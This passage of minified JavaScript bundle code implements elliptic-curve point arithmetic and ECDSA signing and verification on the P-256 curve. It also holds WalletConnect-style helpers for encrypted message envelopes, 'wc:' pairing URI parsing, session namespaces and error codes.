        if (F)
            return {
                x: t.ZERO,
                y: t.ZERO
            };
        if (!t.eql(M, t.ONE))
            throw new Error("invZ was invalid");
        return {
            x: D,
            y: I
        }
    }
    )
      , p = qE(x => {
        if (x.is0()) {
            if (e.allowInfinityPoint && !t.is0(x.py))
                return;
            throw new Error("bad point: ZERO")
        }
        const {x: E, y: B} = x.toAffine();
        if (!t.isValid(E) || !t.isValid(B))
            throw new Error("bad point: x or y not FE");
        const P = t.sqr(B)
          , O = s(E);
        if (!t.eql(P, O))
            throw new Error("bad point: equation left != right");
        if (!x.isTorsionFree())
            throw new Error("bad point: not in prime-order subgroup");
        return !0
    }
    );
    class b {
        constructor(E, B, P) {
            if (this.px = E,
            this.py = B,
            this.pz = P,
            E == null || !t.isValid(E))
                throw new Error("x required");
            if (B == null || !t.isValid(B))
                throw new Error("y required");
            if (P == null || !t.isValid(P))
                throw new Error("z required");
            Object.freeze(this)
        }
        static fromAffine(E) {
            const {x: B, y: P} = E || {};
            if (!E || !t.isValid(B) || !t.isValid(P))
                throw new Error("invalid affine point");
            if (E instanceof b)
                throw new Error("projective point not allowed");
            const O = F => t.eql(F, t.ZERO);
            return O(B) && O(P) ? b.ZERO : new b(B,P,t.ONE)
        }
        get x() {
            return this.toAffine().x
        }
        get y() {
            return this.toAffine().y
        }
        static normalizeZ(E) {
            const B = t.invertBatch(E.map(P => P.pz));
            return E.map( (P, O) => P.toAffine(B[O])).map(b.fromAffine)
        }
        static fromHex(E) {
            const B = b.fromAffine(n(ni("pointHex", E)));
            return B.assertValidity(),
            B
        }
        static fromPrivateKey(E) {
            return b.BASE.multiply(l(E))
        }
        static msm(E, B) {
            return wre(b, o, E, B)
        }
        _setWindowSize(E) {
            T.setWindowSize(this, E)
        }
        assertValidity() {
            p(this)
        }
        hasEvenY() {
            const {y: E} = this.toAffine();
            if (t.isOdd)
                return !t.isOdd(E);
            throw new Error("Field doesn't support isOdd")
        }
        equals(E) {
            f(E);
            const {px: B, py: P, pz: O} = this
              , {px: F, py: D, pz: I} = E
              , M = t.eql(t.mul(B, I), t.mul(F, O))
              , C = t.eql(t.mul(P, I), t.mul(D, O));
            return M && C
        }
        negate() {
            return new b(this.px,t.neg(this.py),this.pz)
        }
        double() {
            const {a: E, b: B} = e
              , P = t.mul(B, n_)
              , {px: O, py: F, pz: D} = this;
            let I = t.ZERO
              , M = t.ZERO
              , C = t.ZERO
              , W = t.mul(O, O)
              , k = t.mul(F, F)
              , H = t.mul(D, D)
              , X = t.mul(O, F);
            return X = t.add(X, X),
            C = t.mul(O, D),
            C = t.add(C, C),
            I = t.mul(E, C),
            M = t.mul(P, H),
            M = t.add(I, M),
            I = t.sub(k, M),
            M = t.add(k, M),
            M = t.mul(I, M),
            I = t.mul(X, I),
            C = t.mul(P, C),
            H = t.mul(E, H),
            X = t.sub(W, H),
            X = t.mul(E, X),
            X = t.add(X, C),
            C = t.add(W, W),
            W = t.add(C, W),
            W = t.add(W, H),
            W = t.mul(W, X),
            M = t.add(M, W),
            H = t.mul(F, D),
            H = t.add(H, H),
            W = t.mul(H, X),
            I = t.sub(I, W),
            C = t.mul(H, k),
            C = t.add(C, C),
            C = t.add(C, C),
            new b(I,M,C)
        }
        add(E) {
            f(E);
            const {px: B, py: P, pz: O} = this
              , {px: F, py: D, pz: I} = E;
            let M = t.ZERO
              , C = t.ZERO
              , W = t.ZERO;
            const k = e.a
              , H = t.mul(e.b, n_);
            let X = t.mul(B, F)
              , Y = t.mul(P, D)
              , V = t.mul(O, I)
              , R = t.add(B, P)
              , _ = t.add(F, D);
            R = t.mul(R, _),
            _ = t.add(X, Y),
            R = t.sub(R, _),
            _ = t.add(B, O);
            let $ = t.add(F, I);
            return _ = t.mul(_, $),
            $ = t.add(X, V),
            _ = t.sub(_, $),
            $ = t.add(P, O),
            M = t.add(D, I),
            $ = t.mul($, M),
            M = t.add(Y, V),
            $ = t.sub($, M),
            W = t.mul(k, _),
            M = t.mul(H, V),
            W = t.add(M, W),
            M = t.sub(Y, W),
            W = t.add(Y, W),
            C = t.mul(M, W),
            Y = t.add(X, X),
            Y = t.add(Y, X),
            V = t.mul(k, V),
            _ = t.mul(H, _),
            Y = t.add(Y, V),
            V = t.sub(X, V),
            V = t.mul(k, V),
            _ = t.add(_, V),
            X = t.mul(Y, _),
            C = t.add(C, X),
            X = t.mul($, _),
            M = t.mul(R, M),
            M = t.sub(M, X),
            X = t.mul(R, Y),
            W = t.mul($, W),
            W = t.add(W, X),
            new b(M,C,W)
        }
        subtract(E) {
            return this.add(E.negate())
        }
        is0() {
            return this.equals(b.ZERO)
        }
        wNAF(E) {
            return T.wNAFCached(this, E, b.normalizeZ)
        }
        multiplyUnsafe(E) {
            const {endo: B, n: P} = e;
            za("scalar", E, Fa, P);
            const O = b.ZERO;
            if (E === Fa)
                return O;
            if (this.is0() || E === Cn)
                return this;
            if (!B || T.hasPrecomputes(this))
                return T.wNAFCachedUnsafe(this, E, b.normalizeZ);
            let {k1neg: F, k1: D, k2neg: I, k2: M} = B.splitScalar(E)
              , C = O
              , W = O
              , k = this;
            for (; D > Fa || M > Fa; )
                D & Cn && (C = C.add(k)),
                M & Cn && (W = W.add(k)),
                k = k.double(),
                D >>= Cn,
                M >>= Cn;
            return F && (C = C.negate()),
            I && (W = W.negate()),
            W = new b(t.mul(W.px, B.beta),W.py,W.pz),
            C.add(W)
        }
        multiply(E) {
            const {endo: B, n: P} = e;
            za("scalar", E, Cn, P);
            let O, F;
            if (B) {
                const {k1neg: D, k1: I, k2neg: M, k2: C} = B.splitScalar(E);
                let {p: W, f: k} = this.wNAF(I)
                  , {p: H, f: X} = this.wNAF(C);
                W = T.constTimeNegate(D, W),
                H = T.constTimeNegate(M, H),
                H = new b(t.mul(H.px, B.beta),H.py,H.pz),
                O = W.add(H),
                F = k.add(X)
            } else {
                const {p: D, f: I} = this.wNAF(E);
                O = D,
                F = I
            }
            return b.normalizeZ([O, F])[0]
        }
        multiplyAndAddUnsafe(E, B, P) {
            const O = b.BASE
              , F = (I, M) => M === Fa || M === Cn || !I.equals(O) ? I.multiplyUnsafe(M) : I.multiply(M)
              , D = F(this, B).add(F(E, P));
            return D.is0() ? void 0 : D
        }
        toAffine(E) {
            return h(this, E)
        }
        isTorsionFree() {
            const {h: E, isTorsionFree: B} = e;
            if (E === Cn)
                return !0;
            if (B)
                return B(b, this);
            throw new Error("isTorsionFree() has not been declared for the elliptic curve")
        }
        clearCofactor() {
            const {h: E, clearCofactor: B} = e;
            return E === Cn ? this : B ? B(b, this) : this.multiplyUnsafe(e.h)
        }
        toRawBytes(E=!0) {
            return Sd("isCompressed", E),
            this.assertValidity(),
            i(b, this, E)
        }
        toHex(E=!0) {
            return Sd("isCompressed", E),
            Bd(this.toRawBytes(E))
        }
    }
    b.BASE = new b(e.Gx,e.Gy,t.ONE),
    b.ZERO = new b(t.ZERO,t.ONE,t.ZERO);
    const v = e.nBitLength
      , T = xre(b, e.endo ? Math.ceil(v / 2) : v);
    return {
        CURVE: e,
        ProjectivePoint: b,
        normPrivateKeyToScalar: l,
        weierstrassEquation: s,
        isWithinCurveOrder: a
    }
}
function Wre(r) {
    const e = HN(r);
    return Jd(e, {
        hash: "hash",
        hmac: "function",
        randomBytes: "function"
    }, {
        bits2int: "function",
        bits2int_modN: "function",
        lowS: "boolean"
    }),
    Object.freeze({
        lowS: !0,
        ...e
    })
}
function Mre(r) {
    const e = Wre(r)
      , {Fp: t, n: o} = e
      , i = t.BYTES + 1
      , n = 2 * t.BYTES + 1;
    function s(V) {
        return Ro(V, o)
    }
    function a(V) {
        return HE(V, o)
    }
    const {ProjectivePoint: l, normPrivateKeyToScalar: f, weierstrassEquation: h, isWithinCurveOrder: p} = Rre({
        ...e,
        toBytes(V, R, _) {
            const $ = R.toAffine()
              , z = t.toBytes($.x)
              , K = Gp;
            return Sd("isCompressed", _),
            _ ? K(Uint8Array.from([R.hasEvenY() ? 2 : 3]), z) : K(Uint8Array.from([4]), z, t.toBytes($.y))
        },
        fromBytes(V) {
            const R = V.length
              , _ = V[0]
              , $ = V.subarray(1);
            if (R === i && (_ === 2 || _ === 3)) {
                const z = ru($);
                if (!F1(z, Cn, t.ORDER))
                    throw new Error("Point is not on curve");
                const K = h(z);
                let j;
                try {
                    j = t.sqrt(K)
                } catch (ie) {
                    const ae = ie instanceof Error ? ": " + ie.message : "";
                    throw new Error("Point is not on curve" + ae)
                }
                const ee = (j & Cn) === Cn;
                return (_ & 1) === 1 !== ee && (j = t.neg(j)),
                {
                    x: z,
                    y: j
                }
            } else if (R === n && _ === 4) {
                const z = t.fromBytes($.subarray(0, t.BYTES))
                  , K = t.fromBytes($.subarray(t.BYTES, 2 * t.BYTES));
                return {
                    x: z,
                    y: K
                }
            } else {
                const z = i
                  , K = n;
                throw new Error("invalid Point, expected length of " + z + ", or uncompressed " + K + ", got " + R)
            }
        }
    })
      , b = V => Bd(Id(V, e.nByteLength));
    function v(V) {
        const R = o >> Cn;
        return V > R
    }
    function T(V) {
        return v(V) ? s(-V) : V
    }
    const x = (V, R, _) => ru(V.slice(R, _));
    class E {
        constructor(R, _, $) {
            this.r = R,
            this.s = _,
            this.recovery = $,
            this.assertValidity()
        }
        static fromCompact(R) {
            const _ = e.nByteLength;
            return R = ni("compactSignature", R, _ * 2),
            new E(x(R, 0, _),x(R, _, 2 * _))
        }
        static fromDER(R) {
            const {r: _, s: $} = _a.toSig(ni("DER", R));
            return new E(_,$)
        }
        assertValidity() {
            za("r", this.r, Cn, o),
            za("s", this.s, Cn, o)
        }
        addRecoveryBit(R) {
            return new E(this.r,this.s,R)
        }
        recoverPublicKey(R) {
            const {r: _, s: $, recovery: z} = this
              , K = I(ni("msgHash", R));
            if (z == null || ![0, 1, 2, 3].includes(z))
                throw new Error("recovery id invalid");
            const j = z === 2 || z === 3 ? _ + e.n : _;
            if (j >= t.ORDER)
                throw new Error("recovery id 2 or 3 invalid");
            const ee = (z & 1) === 0 ? "02" : "03"
              , ie = l.fromHex(ee + b(j))
              , ae = a(j)
              , he = s(-K * ae)
              , me = s($ * ae)
              , Pe = l.BASE.multiplyAndAddUnsafe(ie, he, me);
            if (!Pe)
                throw new Error("point at infinify");
            return Pe.assertValidity(),
            Pe
        }
        hasHighS() {
            return v(this.s)
        }
        normalizeS() {
            return this.hasHighS() ? new E(this.r,s(-this.s),this.recovery) : this
        }
        toDERRawBytes() {
            return _d(this.toDERHex())
        }
        toDERHex() {
            return _a.hexFromSig({
                r: this.r,
                s: this.s
            })
        }
        toCompactRawBytes() {
            return _d(this.toCompactHex())
        }
        toCompactHex() {
            return b(this.r) + b(this.s)
        }
    }
    const B = {
        isValidPrivateKey(V) {
            try {
                return f(V),
                !0
            } catch {
                return !1
            }
        },
        normPrivateKeyToScalar: f,
        randomPrivateKey: () => {
            const V = jN(e.n);
            return yre(e.randomBytes(V), e.n)
        }
        ,
        precompute(V=8, R=l.BASE) {
            return R._setWindowSize(V),
            R.multiply(BigInt(3)),
            R
        }
    };
    function P(V, R=!0) {
        return l.fromPrivateKey(V).toRawBytes(R)
    }
    function O(V) {
        const R = hu(V)
          , _ = typeof V == "string"
          , $ = (R || _) && V.length;
        return R ? $ === i || $ === n : _ ? $ === 2 * i || $ === 2 * n : V instanceof l
    }
    function F(V, R, _=!0) {
        if (O(V))
            throw new Error("first arg must be private key");
        if (!O(R))
            throw new Error("second arg must be public key");
        return l.fromHex(R).multiply(f(V)).toRawBytes(_)
    }
    const D = e.bits2int || function(V) {
        if (V.length > 8192)
            throw new Error("input is too large");
        const R = ru(V)
          , _ = V.length * 8 - e.nBitLength;
        return _ > 0 ? R >> BigInt(_) : R
    }
      , I = e.bits2int_modN || function(V) {
        return s(D(V))
    }
      , M = O3(e.nBitLength);
    function C(V) {
        return za("num < 2^" + e.nBitLength, V, Fa, M),
        Id(V, e.nByteLength)
    }
    function W(V, R, _=k) {
        if (["recovered", "canonical"].some(Fe => Fe in _))
            throw new Error("sign() legacy options not supported");
        const {hash: $, randomBytes: z} = e;
        let {lowS: K, prehash: j, extraEntropy: ee} = _;
        K == null && (K = !0),
        V = ni("msgHash", V),
        r_(_),
        j && (V = ni("prehashed msgHash", $(V)));
        const ie = I(V)
          , ae = f(R)
          , he = [C(ae), C(ie)];
        if (ee != null && ee !== !1) {
            const Fe = ee === !0 ? z(t.BYTES) : ee;
            he.push(ni("extraEntropy", Fe))
        }
        const me = Gp(...he)
          , Pe = ie;
        function _e(Fe) {
            const Je = D(Fe);
            if (!p(Je))
                return;
            const rt = a(Je)
              , xt = l.BASE.multiply(Je).toAffine()
              , Tt = s(xt.x);
            if (Tt === Fa)
                return;
            const Qe = s(rt * s(Pe + Tt * ae));
            if (Qe === Fa)
                return;
            let Ye = (xt.x === Tt ? 0 : 2) | Number(xt.y & Cn)
              , Bt = Qe;
            return K && v(Qe) && (Bt = T(Qe),
            Ye ^= 1),
            new E(Tt,Bt,Ye)
        }
        return {
            seed: me,
            k2sig: _e
        }
    }
    const k = {
        lowS: e.lowS,
        prehash: !1
    }
      , H = {
        lowS: e.lowS,
        prehash: !1
    };
    function X(V, R, _=k) {
        const {seed: $, k2sig: z} = W(V, R, _)
          , K = e;
        return UN(K.hash.outputLen, K.nByteLength, K.hmac)($, z)
    }
    l.BASE._setWindowSize(8);
    function Y(V, R, _, $=H) {
        var Qe;
        const z = V;
        R = ni("msgHash", R),
        _ = ni("publicKey", _);
        const {lowS: K, prehash: j, format: ee} = $;
        if (r_($),
        "strict"in $)
            throw new Error("options.strict was renamed to lowS");
        if (ee !== void 0 && ee !== "compact" && ee !== "der")
            throw new Error("format must be compact or der");
        const ie = typeof z == "string" || hu(z)
          , ae = !ie && !ee && typeof z == "object" && z !== null && typeof z.r == "bigint" && typeof z.s == "bigint";
        if (!ie && !ae)
            throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");
        let he, me;
        try {
            if (ae && (he = new E(z.r,z.s)),
            ie) {
                try {
                    ee !== "compact" && (he = E.fromDER(z))
                } catch (Ye) {
                    if (!(Ye instanceof _a.Err))
                        throw Ye
                }
                !he && ee !== "der" && (he = E.fromCompact(z))
            }
            me = l.fromHex(_)
        } catch {
            return !1
        }
        if (!he || K && he.hasHighS())
            return !1;
        j && (R = e.hash(R));
        const {r: Pe, s: _e} = he
          , Fe = I(R)
          , Je = a(_e)
          , rt = s(Fe * Je)
          , xt = s(Pe * Je)
          , Tt = (Qe = l.BASE.multiplyAndAddUnsafe(me, rt, xt)) == null ? void 0 : Qe.toAffine();
        return Tt ? s(Tt.x) === Pe : !1
    }
    return {
        CURVE: e,
        getPublicKey: P,
        getSharedSecret: F,
        sign: X,
        verify: Y,
        ProjectivePoint: l,
        Signature: E,
        utils: B
    }
}
function Nre(r) {
    return {
        hash: r,
        hmac: (e, ...t) => W1(r, e, kee(...t)),
        randomBytes: Xd
    }
}
function Dre(r, e) {
    const t = o => Mre({
        ...r,
        ...Nre(o)
    });
    return {
        ...t(e),
        create: t
    }
}
const GN = $N(BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff"))
  , Fre = GN.create(BigInt("-3"))
  , Ure = BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b")
  , kre = Dre({
    a: Fre,
    b: Ure,
    Fp: GN,
    n: BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),
    Gx: BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),
    Gy: BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"),
    h: BigInt(1),
    lowS: !1
}, v0)
  , KN = "base10"
  , yo = "base16"
  , as = "base64pad"
  , Nc = "base64url"
  , E0 = "utf8"
  , ZN = 0
  , ja = 1
  , A0 = 2
  , Lre = 0
  , o_ = 1
  , Wp = 12
  , R3 = 32;
function $re() {
    const r = KE.utils.randomPrivateKey()
      , e = KE.getPublicKey(r);
    return {
        privateKey: Do(r, yo),
        publicKey: Do(e, yo)
    }
}
function ZE() {
    const r = Xd(R3);
    return Do(r, yo)
}
function zre(r, e) {
    const t = KE.getSharedSecret(ki(r, yo), ki(e, yo))
      , o = Hte(v0, t, void 0, void 0, R3);
    return Do(o, yo)
}
function Em(r) {
    const e = v0(ki(r, yo));
    return Do(e, yo)
}
function js(r) {
    const e = v0(ki(r, E0));
    return Do(e, yo)
}
function YN(r) {
    return ki(`${r}`, KN)
}
function pu(r) {
    return Number(Do(r, KN))
}
function XN(r) {
    return r.replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "")
}
function JN(r) {
    const e = r.replace(/-/g, "+").replace(/_/g, "/")
      , t = (4 - e.length % 4) % 4;
    return e + "=".repeat(t)
}
function jre(r) {
    const e = YN(typeof r.type < "u" ? r.type : ZN);
    if (pu(e) === ja && typeof r.senderPublicKey > "u")
        throw new Error("Missing sender public key for type 1 envelope");
    const t = typeof r.senderPublicKey < "u" ? ki(r.senderPublicKey, yo) : void 0
      , o = typeof r.iv < "u" ? ki(r.iv, yo) : Xd(Wp)
      , i = ki(r.symKey, yo)
      , n = NN(i, o).encrypt(ki(r.message, E0))
      , s = QN({
        type: e,
        sealed: n,
        iv: o,
        senderPublicKey: t
    });
    return r.encoding === Nc ? XN(s) : s
}
function qre(r) {
    const e = ki(r.symKey, yo)
      , {sealed: t, iv: o} = Kp({
        encoded: r.encoded,
        encoding: r.encoding
    })
      , i = NN(e, o).decrypt(t);
    if (i === null)
        throw new Error("Failed to decrypt");
    return Do(i, E0)
}
function Vre(r, e) {
    const t = YN(A0)
      , o = Xd(Wp)
      , i = ki(r, E0)
      , n = QN({
        type: t,
        sealed: i,
        iv: o
    });
    return e === Nc ? XN(n) : n
}
function Hre(r, e) {
    const {sealed: t} = Kp({
        encoded: r,
        encoding: e
    });
    return Do(t, E0)
}
function QN(r) {
    if (pu(r.type) === A0)
        return Do(Rp([r.type, r.sealed]), as);
    if (pu(r.type) === ja) {
        if (typeof r.senderPublicKey > "u")
            throw new Error("Missing sender public key for type 1 envelope");
        return Do(Rp([r.type, r.senderPublicKey, r.iv, r.sealed]), as)
    }
    return Do(Rp([r.type, r.iv, r.sealed]), as)
}
function Kp(r) {
    const e = (r.encoding || as) === Nc ? JN(r.encoded) : r.encoded
      , t = ki(e, as)
      , o = t.slice(Lre, o_)
      , i = o_;
    if (pu(o) === ja) {
        const l = i + R3
          , f = l + Wp
          , h = t.slice(i, l)
          , p = t.slice(l, f)
          , b = t.slice(f);
        return {
            type: o,
            sealed: b,
            iv: p,
            senderPublicKey: h
        }
    }
    if (pu(o) === A0) {
        const l = t.slice(i)
          , f = Xd(Wp);
        return {
            type: o,
            sealed: l,
            iv: f
        }
    }
    const n = i + Wp
      , s = t.slice(i, n)
      , a = t.slice(n);
    return {
        type: o,
        sealed: a,
        iv: s
    }
}
function Gre(r, e) {
    const t = Kp({
        encoded: r,
        encoding: e == null ? void 0 : e.encoding
    });
    return eD({
        type: pu(t.type),
        senderPublicKey: typeof t.senderPublicKey < "u" ? Do(t.senderPublicKey, yo) : void 0,
        receiverPublicKey: e == null ? void 0 : e.receiverPublicKey
    })
}
function eD(r) {
    const e = (r == null ? void 0 : r.type) || ZN;
    if (e === ja) {
        if (typeof (r == null ? void 0 : r.senderPublicKey) > "u")
            throw new Error("missing sender public key");
        if (typeof (r == null ? void 0 : r.receiverPublicKey) > "u")
            throw new Error("missing receiver public key")
    }
    return {
        type: e,
        senderPublicKey: r == null ? void 0 : r.senderPublicKey,
        receiverPublicKey: r == null ? void 0 : r.receiverPublicKey
    }
}
function i_(r) {
    return r.type === ja && typeof r.senderPublicKey == "string" && typeof r.receiverPublicKey == "string"
}
function s_(r) {
    return r.type === A0
}
function Kre(r) {
    const e = Buffer.from(r.x, "base64")
      , t = Buffer.from(r.y, "base64");
    return Rp([new Uint8Array([4]), e, t])
}
function Zre(r, e) {
    const [t,o,i] = r.split(".")
      , n = Buffer.from(JN(i), "base64");
    if (n.length !== 64)
        throw new Error("Invalid signature length");
    const s = n.slice(0, 32)
      , a = n.slice(32, 64)
      , l = `${t}.${o}`
      , f = v0(l)
      , h = Kre(e);
    if (!kre.verify(Rp([s, a]), f, h))
        throw new Error("Invalid signature");
    return NE(r).payload
}
const Yre = "irn";
function i1(r) {
    return (r == null ? void 0 : r.relay) || {
        protocol: Yre
    }
}
function Sp(r) {
    const e = tee[r];
    if (typeof e > "u")
        throw new Error(`Relay Protocol not supported: ${r}`);
    return e
}
function Xre(r, e="-") {
    const t = {}
      , o = "relay" + e;
    return Object.keys(r).forEach(i => {
        if (i.startsWith(o)) {
            const n = i.replace(o, "")
              , s = r[i];
            t[n] = s
        }
    }
    ),
    t
}
function a_(r) {
    if (!r.includes("wc:")) {
        const f = TN(r);
        f != null && f.includes("wc:") && (r = f)
    }
    r = r.includes("wc://") ? r.replace("wc://", "") : r,
    r = r.includes("wc:") ? r.replace("wc:", "") : r;
    const e = r.indexOf(":")
      , t = r.indexOf("?") !== -1 ? r.indexOf("?") : void 0
      , o = r.substring(0, e)
      , i = r.substring(e + 1, t).split("@")
      , n = typeof t < "u" ? r.substring(t) : ""
      , s = new URLSearchParams(n)
      , a = {};
    s.forEach( (f, h) => {
        a[h] = f
    }
    );
    const l = typeof a.methods == "string" ? a.methods.split(",") : void 0;
    return {
        protocol: o,
        topic: Jre(i[0]),
        version: parseInt(i[1], 10),
        symKey: a.symKey,
        relay: Xre(a),
        methods: l,
        expiryTimestamp: a.expiryTimestamp ? parseInt(a.expiryTimestamp, 10) : void 0
    }
}
function Jre(r) {
    return r.startsWith("//") ? r.substring(2) : r
}
function Qre(r, e="-") {
    const t = "relay"
      , o = {};
    return Object.keys(r).forEach(i => {
        const n = i
          , s = t + e + n;
        r[n] && (o[s] = r[n])
    }
    ),
    o
}
function c_(r) {
    const e = new URLSearchParams
      , t = Qre(r.relay);
    Object.keys(t).sort().forEach(i => {
        e.set(i, t[i])
    }
    ),
    e.set("symKey", r.symKey),
    r.expiryTimestamp && e.set("expiryTimestamp", r.expiryTimestamp.toString()),
    r.methods && e.set("methods", r.methods.join(","));
    const o = e.toString();
    return `${r.protocol}:${r.topic}@${r.version}?${o}`
}
function hy(r, e, t) {
    return `${r}?wc_ev=${t}&topic=${e}`
}
var ene = Object.defineProperty
  , tne = Object.defineProperties
  , rne = Object.getOwnPropertyDescriptors
  , l_ = Object.getOwnPropertySymbols
  , nne = Object.prototype.hasOwnProperty
  , one = Object.prototype.propertyIsEnumerable
  , u_ = (r, e, t) => e in r ? ene(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , ine = (r, e) => {
    for (var t in e || (e = {}))
        nne.call(e, t) && u_(r, t, e[t]);
    if (l_)
        for (var t of l_(e))
            one.call(e, t) && u_(r, t, e[t]);
    return r
}
  , sne = (r, e) => tne(r, rne(e));
function Qd(r) {
    const e = [];
    return r.forEach(t => {
        const [o,i] = t.split(":");
        e.push(`${o}:${i}`)
    }
    ),
    e
}
function ane(r) {
    const e = [];
    return Object.values(r).forEach(t => {
        e.push(...Qd(t.accounts))
    }
    ),
    e
}
function cne(r, e) {
    const t = [];
    return Object.values(r).forEach(o => {
        Qd(o.accounts).includes(e) && t.push(...o.methods)
    }
    ),
    t
}
function lne(r, e) {
    const t = [];
    return Object.values(r).forEach(o => {
        Qd(o.accounts).includes(e) && t.push(...o.events)
    }
    ),
    t
}
function tD(r) {
    return r.includes(":")
}
function une(r) {
    return tD(r) ? r.split(":")[0] : r
}
function f_(r) {
    var e, t, o;
    const i = {};
    if (!Zp(r))
        return i;
    for (const [n,s] of Object.entries(r)) {
        const a = tD(n) ? [n] : s.chains
          , l = s.methods || []
          , f = s.events || []
          , h = une(n);
        i[h] = sne(ine({}, i[h]), {
            chains: tu(a, (e = i[h]) == null ? void 0 : e.chains),
            methods: tu(l, (t = i[h]) == null ? void 0 : t.methods),
            events: tu(f, (o = i[h]) == null ? void 0 : o.events)
        })
    }
    return i
}
function fne(r) {
    const e = {};
    return r == null || r.forEach(t => {
        var o;
        const [i,n] = t.split(":");
        e[i] || (e[i] = {
            accounts: [],
            chains: [],
            events: [],
            methods: []
        }),
        e[i].accounts.push(t),
        (o = e[i].chains) == null || o.push(`${i}:${n}`)
    }
    ),
    e
}
function d_(r, e) {
    e = e.map(o => o.replace("did:pkh:", ""));
    const t = fne(e);
    for (const [o,i] of Object.entries(t))
        i.methods ? i.methods = tu(i.methods, r) : i.methods = r,
        i.events = ["chainChanged", "accountsChanged"];
    return t
}
function dne(r, e) {
    var t, o, i, n, s, a;
    const l = f_(r)
      , f = f_(e)
      , h = {}
      , p = Object.keys(l).concat(Object.keys(f));
    for (const b of p)
        h[b] = {
            chains: tu((t = l[b]) == null ? void 0 : t.chains, (o = f[b]) == null ? void 0 : o.chains),
            methods: tu((i = l[b]) == null ? void 0 : i.methods, (n = f[b]) == null ? void 0 : n.methods),
            events: tu((s = l[b]) == null ? void 0 : s.events, (a = f[b]) == null ? void 0 : a.events)
        };
    return h
}
const hne = {
    INVALID_METHOD: {
        message: "Invalid method.",
        code: 1001
    },
    INVALID_EVENT: {
        message: "Invalid event.",
        code: 1002
    },
    INVALID_UPDATE_REQUEST: {
        message: "Invalid update request.",
        code: 1003
    },
    INVALID_EXTEND_REQUEST: {
        message: "Invalid extend request.",
        code: 1004
    },
    INVALID_SESSION_SETTLE_REQUEST: {
        message: "Invalid session settle request.",
        code: 1005
    },
    UNAUTHORIZED_METHOD: {
        message: "Unauthorized method.",
        code: 3001
    },
    UNAUTHORIZED_EVENT: {
        message: "Unauthorized event.",
        code: 3002
    },
    UNAUTHORIZED_UPDATE_REQUEST: {
        message: "Unauthorized update request.",
        code: 3003
    },
    UNAUTHORIZED_EXTEND_REQUEST: {
        message: "Unauthorized extend request.",
        code: 3004
    },
    USER_REJECTED: {
        message: "User rejected.",
        code: 5e3
    },
    USER_REJECTED_CHAINS: {
        message: "User rejected chains.",
        code: 5001
    },
    USER_REJECTED_METHODS: {
        message: "User rejected methods.",
        code: 5002
    },
    USER_REJECTED_EVENTS: {
        message: "User rejected events.",
        code: 5003
    },
    UNSUPPORTED_CHAINS: {
        message: "Unsupported chains.",
        code: 5100
    },
    UNSUPPORTED_METHODS: {
        message: "Unsupported methods.",
        code: 5101
    },
    UNSUPPORTED_EVENTS: {
        message: "Unsupported events.",
        code: 5102
    },
    UNSUPPORTED_ACCOUNTS: {
        message: "Unsupported accounts.",
        code: 5103
    },
    UNSUPPORTED_NAMESPACE_KEY: {
        message: "Unsupported namespace key.",
        code: 5104
    },
    USER_DISCONNECTED: {
        message: "User disconnected.",
        code: 6e3
    },
    SESSION_SETTLEMENT_FAILED: {
        message: "Session settlement failed.",
        code: 7e3
    },
    WC_METHOD_UNSUPPORTED: {
        message: "Unsupported wc_ method.",
        code: 10001
    }
}
  , pne = {
    NOT_INITIALIZED: {
        message: "Not initialized.",
        code: 1
    },
    NO_MATCHING_KEY: {
        message: "No matching key.",
        code: 2
    },
    RESTORE_WILL_OVERRIDE: {
        message: "Restore will override.",
        code: 3
    },
    RESUBSCRIBED: {
        message: "Resubscribed.",
        code: 4
    },
    MISSING_OR_INVALID: {
        message: "Missing or invalid.",
        code: 5
    },
    EXPIRED: {
        message: "Expired.",
        code: 6
    },
    UNKNOWN_TYPE: {
        message: "Unknown type.",
        code: 7
    },
    MISMATCHED_TOPIC: {
        message: "Mismatched topic.",
        code: 8
    },
    NON_CONFORMING_NAMESPACES: {
        message: "Non conforming namespaces.",
        code: 9
    }
};
function Xe(r, e) {
    const {message: t, code: o} = pne[r];
    return {
        message: e ? `${t} ${e}` : t,
        code: o
    }
}
function Nr(r, e) {
    const {message: t, code: o} = hne[r];
    return {
        message: e ? `${t} ${e}` : t,
        code: o
    }
}
function P0(r, e) {
    return !!Array.isArray(r)
}
function Zp(r) {
    return Object.getPrototypeOf(r) === Object.prototype && Object.keys(r).length
}
function zn(r) {
    return typeof r > "u"
}
function un(r, e) {
    return e && zn(r) ? !0 : typeof r == "string" && !!r.trim().length
}
function W3(r, e) {
    return e && zn(r) ? !0 : typeof r == "number" && !isNaN(r)
}
function gne(r, e) {
    const {requiredNamespaces: t} = e
      , o = Object.keys(r.namespaces)
      , i = Object.keys(t);
    let n = !0;
    return $l(i, o) ? (o.forEach(s => {
        const {accounts: a, methods: l, events: f} = r.namespaces[s]
          , h = Qd(a)
          , p = t[s];
        (!$l(bN(s, p), h) || !$l(p.methods, l) || !$l(p.events, f)) && (n = !1)
    }
    ),
    n) : !1
}
function s1(r) {
    return un(r, !1) && r.includes(":") ? r.split(":").length === 2 : !1
}
function yne(r) {
    if (un(r, !1) && r.includes(":")) {
        const e = r.split(":");
        if (e.length === 3) {
            const t = e[0] + ":" + e[1];
            return !!e[2] && s1(t)
        }
    }
    return !1
}
function bne(r) {
    function e(t) {
        try {
            return typeof new URL(t) < "u"
        } catch {
            return !1
        }
    }
    try {
        if (un(r, !1)) {
            if (e(r))
                return !0;
            const t = TN(r);
            return e(t)
        }
    } catch {}
    return !1
}
function mne(r) {
    var e;
    return (e = r == null ? void 0 : r.proposer) == null ? void 0 : e.publicKey
}
function xne(r) {
    return r == null ? void 0 : r.topic
}
function wne(r, e) {
    let t = null;
    return un(r == null ? void 0 : r.publicKey, !1) || (t = Xe("MISSING_OR_INVALID", `${e} controller public key should be a string`)),
    t
}
function h_(r) {
    let e = !0;
    return P0(r) ? r.length && (e = r.every(t => un(t, !1))) : e = !1,
    e
}
function vne(r, e, t) {
    let o = null;
    return P0(e) && e.length ? e.forEach(i => {
